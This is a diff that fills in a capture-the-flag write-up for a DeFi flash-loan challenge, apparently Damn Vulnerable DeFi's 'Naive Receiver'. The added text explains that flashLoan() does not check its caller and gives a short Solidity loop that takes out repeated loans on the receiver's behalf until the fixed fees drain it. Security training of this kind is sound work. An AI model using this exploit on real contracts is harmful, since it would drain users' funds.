@@ -93,13 +93,53 @@ By transfering a single `DVT` token, the values checked at the guard will be dif
 To beat this level, we need to comply with
 
 ```solidity
-
+assertEq(address(receiver).balance, 0);
+assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
 ```
+
+In other words: Drain the receiver, putting its funds in the pool.
 
 ### Solution
 
-???
+The fees of the pool are notably high
+
+```solidiy
+uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
+```
+
+And the `flashLoan()` function doesn't control for the caller
+
+```solidity
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != ETH)
+        revert UnsupportedCurrency();
+
+    uint256 balanceBefore = address(this).balance;
+
+    // Transfer ETH and handle control to receiver
+    SafeTransferLib.safeTransferETH(address(receiver), amount);
+    if(receiver.onFlashLoan(
+        msg.sender,
+        ETH,
+// ....
+```
+
+Let's just borrow on behalf of the receiver, then 😈
+
+```solidity
+IPool pool = IPool(address(level.pool()));
+address receiverAddr = address(level.receiver());
+
+for (uint8 i = 0; i < 10; i++) {
+  pool.flashLoan(receiverAddr, level.pool().ETH(), address(pool).balance, "0x");
+}
+```
 
 ### References
 
-* ???
+* https://eips.ethereum.org/EIPS/eip-3156
